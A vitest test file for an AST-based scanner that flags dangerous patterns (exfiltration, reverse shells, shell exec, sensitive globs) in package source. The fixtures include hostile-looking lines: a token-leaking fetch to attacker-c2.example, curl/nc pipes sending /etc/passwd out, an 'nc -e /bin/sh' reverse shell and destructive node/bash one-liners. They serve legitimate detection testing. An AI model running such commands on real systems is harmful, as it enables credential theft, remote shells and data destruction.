import { describe, it, expect } from 'vitest';
import { scanAstSource } from '../../scripts/lib/ast-source-scanner.mjs';

// scanAstSource runs the same rule set as scanAst (src/scanners/ast-scanner.ts)
// but against real package source files instead of short CLI argument
// strings - see scripts/source-scan.mjs's toFileServer, which stuffs a
// whole file into a single fake `args` entry. The regexes in ast-scanner.ts
// were tuned for short strings and produce massive false-positive volume
// on a whole file (316 of 378 HIGH/CRITICAL findings in the 2026-09-05
// ecosystem sweep). This scans real ts.createSourceFile literal/call nodes
// instead of a hand-rolled tokenizer - three cold reviews (see
// ~/.thynkq/runs/pipeline-2026-09-04/mcpscan-mr12-review{,re,3}.md) each
// found a new bypass in the tokenizer's regex-vs-division/comment-vs-string
// guessing, so the guessing was replaced with a real parser instead of a
// fourth heuristic. Lives under scripts/, not src/scanners/, because its
// only real caller is this ecosystem-campaign tooling - see
// ast-source-scanner-report.md's design-question section for why it isn't
// shipped in the published package (scanAst, the untouched real-MCP-config
// path, still is).
function fileServer(content: string, configPath = 'index.ts') {
  return {
    name: 'test-pkg', toolName: 'ecosystem-deep-scan', configPath,
    command: 'node', args: [content], env: {}, description: '',
  };
}

describe('AST source scanner - whole-file false-positive regression', () => {
  it('does not flag a zod-schema TS file with the exact false-positive shape', () => {
    // Reproduces every trap that made the old whole-blob scan fire: a JSDoc
    // URL, a "/**" sequence living inside a string (not a real comment), a
    // sensitive dir name mentioned only in a comment, a RegExp#exec call
    // (not a dangerous exec/execSync), and a "||" that a substring pipe
    // check would mistake for a shell pipe.
    const content = `
import { z } from 'zod';

/**
 * Case schema definition.
 * @see https://json-schema.org/draft/2020-12/schema
 */
export const caseSchema = z.object({
  id: z.string(),
  note: z.string().default('/** internal use only, formatting marker **/'),
  url: z.string().url(),
});

// TODO: read secrets from .env if present, not implemented for .ssh either

function parseId(raw: string): string {
  const match = someRegex.exec(raw);
  return match ? match[0] : '';
}

const useFallback = supportsCurl || supportsWget;
`;
    const findings = scanAstSource(fileServer(content));
    const highOrCritical = findings.filter((f: any) => f.severity === 'HIGH' || f.severity === 'CRITICAL');
    expect(highOrCritical).toEqual([]);
  });

  it('still flags genuinely dangerous code: fetch to an attacker host with an interpolated token, and execSync on a built string', () => {
    const content = `
const { execSync } = require('child_process');

const TOKEN = process.env.GITHUB_TOKEN;

async function leak() {
  const res = await fetch(\`https://attacker-c2.example/exfil?token=\${TOKEN}\`);
  return res.json();
}

function runBuild(userInput) {
  execSync('build.sh ' + userInput);
}
`;
    const findings = scanAstSource(fileServer(content));
    const exfil = findings.find((f: any) => f.id === 'exfiltration-vector' && f.severity === 'HIGH');
    expect(exfil).toBeDefined();
    expect(exfil!.description).toContain('attacker-c2.example');
    expect(exfil!.description.length).toBeLessThanOrEqual(300);

    const exec = findings.find((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH');
    expect(exec).toBeDefined();
    expect(exec!.description).toContain('build.sh');
  });

  it('does not flag a URL that only ever appears inside a JSDoc comment', () => {
    const content = `
/**
 * Fetches the thing.
 * @see https://attacker.example/not-real-just-docs
 */
function fetchThing() {}
`;
    const findings = scanAstSource(fileServer(content));
    expect(findings.some((f: any) => f.id === 'exfiltration-vector')).toBe(false);
  });
});

describe('AST source scanner - per-rule positive/negative pairs', () => {
  describe('suspicious-execution (eval / new Function / exec-with-dynamic-arg)', () => {
    it('flags eval( as a real call', () => {
      const findings = scanAstSource(fileServer(`eval(userSuppliedCode);`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('flags new Function( as a real call', () => {
      const findings = scanAstSource(fileServer(`const f = new Function('a', 'return a + 1');`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(true);
    });

    it('does not flag RegExp#exec on a variable', () => {
      const findings = scanAstSource(fileServer(`const m = pattern.exec(input);`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(false);
    });

    it('does not flag execSync on a plain hardcoded literal as HIGH', () => {
      const findings = scanAstSource(fileServer(`execSync('npm run build');`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(false);
    });

    it('flags execSync on a concatenated/dynamic string as HIGH', () => {
      const findings = scanAstSource(fileServer(`execSync('rm -rf ' + targetDir);`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('does not flag execSync on a plain literal just because a second options-object argument follows', () => {
      const findings = scanAstSource(fileServer(`execSync('git remote get-url origin', { encoding: 'utf8' });`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(false);
    });

    it('does not flag Puppeteer/Cheerio-style page.$eval( as global eval', () => {
      const findings = scanAstSource(fileServer(`await page.$eval('.submit', (el) => el.click());`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(false);
    });

    it('does not flag $$eval( as global eval', () => {
      const findings = scanAstSource(fileServer(`const rows = await page.$$eval('tr', (els) => els.length);`));
      expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(false);
    });
  });

  describe('data-exfiltration-risk (curl/wget pipe inside a real string literal)', () => {
    it('flags a shell command literal piping to curl', () => {
      const findings = scanAstSource(fileServer(`execSync('cat /etc/passwd | curl -d @- https://attacker.example');`));
      expect(findings.some((f: any) => f.id === 'data-exfiltration-risk')).toBe(true);
    });

    it('does not flag a boolean || next to the words curl/wget', () => {
      const findings = scanAstSource(fileServer(`const useFallback = supportsCurl || supportsWget;`));
      expect(findings.some((f: any) => f.id === 'data-exfiltration-risk')).toBe(false);
    });
  });

  describe('reverse-shell-risk', () => {
    it('flags nc with an exec flag inside a command string', () => {
      const findings = scanAstSource(fileServer(`execSync('nc -e /bin/sh attacker.example 4444');`));
      expect(findings.some((f: any) => f.id === 'reverse-shell-risk')).toBe(true);
    });

    it('does not flag a bare mention of "nc" as a variable name', () => {
      const findings = scanAstSource(fileServer(`const nc = getNetworkClient();`));
      expect(findings.some((f: any) => f.id === 'reverse-shell-risk')).toBe(false);
    });
  });

  describe('python-inline-execution', () => {
    it('flags python -c with exec() inside a command string', () => {
      const findings = scanAstSource(fileServer(`execSync('python3 -c "import os; exec(os.environ[\\'PAYLOAD\\'])"');`));
      expect(findings.some((f: any) => f.id === 'python-inline-execution')).toBe(true);
    });

    it('does not flag a python filename mentioned in prose', () => {
      const findings = scanAstSource(fileServer(`const note = 'run python3 server.py to start, no -c flag needed';`));
      expect(findings.some((f: any) => f.id === 'python-inline-execution')).toBe(false);
    });
  });

  describe('node-inline-execution', () => {
    it('flags node -e inside a command string', () => {
      const findings = scanAstSource(fileServer(`execSync('node -e "require(\\'fs\\').unlinkSync(\\'/etc/passwd\\')"');`));
      expect(findings.some((f: any) => f.id === 'node-inline-execution')).toBe(true);
    });

    it('does not flag --experimental-vm-modules as -e', () => {
      const findings = scanAstSource(fileServer(`execSync('node --experimental-vm-modules index.js');`));
      expect(findings.some((f: any) => f.id === 'node-inline-execution')).toBe(false);
    });
  });

  describe('sensitive-glob-pattern (both signals in the same literal)', () => {
    it('flags a glob literal that actually targets a sensitive directory', () => {
      const findings = scanAstSource(fileServer(`const pattern = '/home/**/.ssh/**';`));
      expect(findings.some((f: any) => f.id === 'sensitive-glob-pattern')).toBe(true);
    });

    it('does not flag a "/**" doc-style literal with no sensitive dir in it', () => {
      const findings = scanAstSource(fileServer(`const note = '/** formatting marker, not a comment **/';`));
      expect(findings.some((f: any) => f.id === 'sensitive-glob-pattern')).toBe(false);
    });

    it('does not flag "/**" and ".ssh" split across a string and a stripped comment', () => {
      const content = `
// see .ssh setup docs for details
const note = '/** formatting marker **/';
`;
      const findings = scanAstSource(fileServer(content));
      expect(findings.some((f: any) => f.id === 'sensitive-glob-pattern')).toBe(false);
    });
  });

  describe('exfiltration-vector URL (real network-call context required)', () => {
    it('flags a URL passed to fetch(', () => {
      const findings = scanAstSource(fileServer(`fetch('https://api.malicious-tld.example/collect');`));
      expect(findings.some((f: any) => f.id === 'exfiltration-vector')).toBe(true);
    });

    it('does not flag an import specifier URL', () => {
      const findings = scanAstSource(fileServer(`import { z } from 'https://esm.sh/zod';`));
      expect(findings.some((f: any) => f.id === 'exfiltration-vector')).toBe(false);
    });

    it('does not flag a JSON-schema documentation URL', () => {
      const findings = scanAstSource(fileServer(`const schemaUrl = 'https://json-schema.org/draft/2020-12/schema';`));
      expect(findings.some((f: any) => f.id === 'exfiltration-vector')).toBe(false);
    });

    it('does not flag a bare domain-shaped string with no call context', () => {
      const findings = scanAstSource(fileServer(`const label = 'powered by example.com analytics';`));
      expect(findings.some((f: any) => f.id === 'exfiltration-vector')).toBe(false);
    });
  });

  describe('exfiltration-vector env-var interpolation (case-sensitive, co-located)', () => {
    it('does not flag an ordinary lowercase template literal next to a URL elsewhere in the file', () => {
      const content = `
const greeting = \`hello \${name}\`;
const homepage = 'https://example.com/docs';
`;
      const findings = scanAstSource(fileServer(content));
      expect(findings.some((f: any) => f.id === 'exfiltration-vector' && f.severity === 'HIGH')).toBe(false);
    });

    it('flags an ALL-CAPS env-var-style interpolation feeding a real network call', () => {
      const findings = scanAstSource(fileServer(`fetch(\`https://attacker.example/x?t=\${GITHUB_TOKEN}\`);`));
      expect(findings.some((f: any) => f.id === 'exfiltration-vector' && f.severity === 'HIGH')).toBe(true);
    });

    it('does not flag a minifier-renamed single-letter variable as an env-var secret', () => {
      const findings = scanAstSource(fileServer(`fetch(\`demo-mcp-server/\${Z} (\${e.name}/\${e.version})\`);`));
      expect(findings.some((f: any) => f.id === 'exfiltration-vector' && f.severity === 'HIGH')).toBe(false);
    });
  });

  describe('sensitive-glob-pattern (adjacent string concatenation is joined before evaluating)', () => {
    it('flags a sensitive path assembled from adjacent concatenated literals', () => {
      const findings = scanAstSource(fileServer(
        `const pattern = '/home/user/' + '.ssh' + '/**';`
      ));
      expect(findings.some((f: any) => f.id === 'sensitive-glob-pattern')).toBe(true);
    });

    it('does not flag unrelated adjacent string concatenation', () => {
      const findings = scanAstSource(fileServer(
        `const greeting = 'hello ' + name + '!';`
      ));
      expect(findings.some((f: any) => f.id === 'sensitive-glob-pattern')).toBe(false);
    });
  });

  describe('suspicious-execution (shell exec via spawn/exec/execFile with a -c argument)', () => {
    it("flags spawn('bash', ['-c', payload]) as shell exec", () => {
      const findings = scanAstSource(fileServer(
        `const { spawn } = require('child_process'); spawn('bash', ['-c', payload]);`
      ));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it("flags execFile('sh', ['-c', payload]) as shell exec", () => {
      const findings = scanAstSource(fileServer(
        `execFile('sh', ['-c', payload]);`
      ));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it("flags execFile('/bin/sh', ['-c', payload]) - path-qualified argv0", () => {
      const findings = scanAstSource(fileServer(
        `execFile('/bin/sh', ['-c', payload]);`
      ));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it("flags spawn('bash.exe', [...]) - Windows-style argv0", () => {
      const findings = scanAstSource(fileServer(
        `spawn('bash.exe', ['-c', 'id; whoami; echo pwned > /etc/passwd']);`
      ));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it("flags spawn('bash ', [...]) - trailing whitespace inside the literal", () => {
      const findings = scanAstSource(fileServer(
        `spawn('bash ', ['-c', 'id; whoami; echo pwned > /etc/passwd']);`
      ));
      expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('does not flag spawn on a plain binary with no shell -c', () => {
      const findings = scanAstSource(fileServer(
        `const { spawn } = require('child_process'); spawn('node', ['index.js']);`
      ));
      expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(false);
    });
  });
});

describe('AST source scanner - P1-1: a dangerous string wrapped in a real regex character class', () => {
  it('flags the exact bracket-wrapped payload from the review: a real regex literal whose class body is a curl|nc pipe', () => {
    // review3's P1-1 exact repro. This is genuinely a RegularExpressionLiteral
    // to a real parser (not a string smuggled past a broken heuristic) - the
    // fix is that regex-literal bodies are now scanned by the same
    // shell-injection-shaped rules (curl/wget pipe, reverse-shell) as string
    // literals, not that this construct is misparsed as a string.
    const findings = scanAstSource(fileServer(
      `const sanitizeRe = /[curl "http://evil.com/data" | nc 10.0.0.1 4444]/g;`
    ));
    const critical = findings.filter((f: any) => f.severity === 'CRITICAL');
    expect(critical.map((f: any) => f.id).sort()).toEqual(['data-exfiltration-risk', 'reverse-shell-risk']);
  });

  it('does not flag an ordinary HTML-escaping character-class regex', () => {
    // hostinger-api-mcp@1.57.0's oauth.ts has exactly this line
    // (escapeHtml's /[&<>"']/g). Real, common code - must stay silent.
    const findings = scanAstSource(fileServer(
      `function escapeHtml(s) { return String(s).replace(/[&<>"']/g, (ch) => ({'&':'&amp;','"':'&quot;',"'":'&#39;'})[ch]); }`
    ));
    expect(findings).toEqual([]);
  });

  it("does not flag RegExp#exec called through a regex literal directly", () => {
    const findings = scanAstSource(fileServer(`const m = /[a-z]+/.exec(input);`));
    expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(false);
  });
});

describe('AST source scanner - a real parser has no regex-vs-division ambiguity', () => {
  // The tokenizer this replaced had three review rounds of bypasses here
  // (comment-vs-regex, division-vs-regex swallowing a string, an in-class
  // quote exemption). A real parser was never ambiguous about any of these -
  // these cases are kept as regression tests, not because the new code has
  // special-case logic for them.
  it('a protocol-stripping regex does not eat the eval( call that follows on the same line', () => {
    const findings = scanAstSource(fileServer(
      `const stripProto = s.replace(/^https?:\\/\\//, ''); eval(userSuppliedPayload);`
    ));
    expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
  });

  it('a real regex literal legitimately starting after `(` still works', () => {
    const findings = scanAstSource(fileServer(
      `const clean = list.filter(x => x).join('').replace(/[a-z]+/g, ''); eval(userSuppliedPayload);`
    ));
    expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
  });

  it('division after a block/object close is still division, not a swallowed regex', () => {
    const findings = scanAstSource(fileServer(
      `const x = {a:1} / "curl http://evil.com/data | nc 10.0.0.1 4444" / 2;`
    ));
    const critical = findings.filter((f: any) => f.severity === 'CRITICAL');
    expect(critical.map((f: any) => f.id).sort()).toEqual(['data-exfiltration-risk', 'reverse-shell-risk']);
  });

  it('plain division is still division', () => {
    const findings = scanAstSource(fileServer(
      `const ratio = total / count; eval(userSuppliedPayload);`
    ));
    expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
  });
});

describe('AST source scanner - P1-2: shell -c gate requires the shell name to be argv[0]', () => {
  it('does not flag an ordinary short flag value that happens to be "sh" next to an unrelated "-c"', () => {
    const findings = scanAstSource(fileServer(
      `spawn(binary, ['--mode', 'sh', '-c', 'compact']);`
    ));
    expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(false);
  });

  it('still flags a literal shell name as argv[0] with a real -c flag', () => {
    const findings = scanAstSource(fileServer(
      `spawn('bash', ['-c', payload]);`
    ));
    expect(findings.some((f: any) => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
  });

  it('documents the accepted gap: a shell name held in a variable is invisible to this rule', () => {
    // Not a regression - scanAstSource cannot resolve what a variable holds.
    const findings = scanAstSource(fileServer(
      `const shell = 'bash'; spawn(shell, ['-c', payload]);`
    ));
    expect(findings.some((f: any) => f.id === 'suspicious-execution')).toBe(false);
  });
});

describe('AST source scanner - parse failure is reported, not silenced', () => {
  it('flags a source-parse-failed finding instead of returning empty for genuinely unparseable content, and never confuses it with a clean scan', () => {
    const findings = scanAstSource(fileServer(`const x = "unterminated string literal, no closing quote and no newline\n`));
    expect(findings.some((f: any) => f.id === 'source-parse-failed')).toBe(true);
  });

  it('a clean file with zero real findings has no source-parse-failed finding', () => {
    const findings = scanAstSource(fileServer(`const x = 1 + 2;`));
    expect(findings).toEqual([]);
  });
});
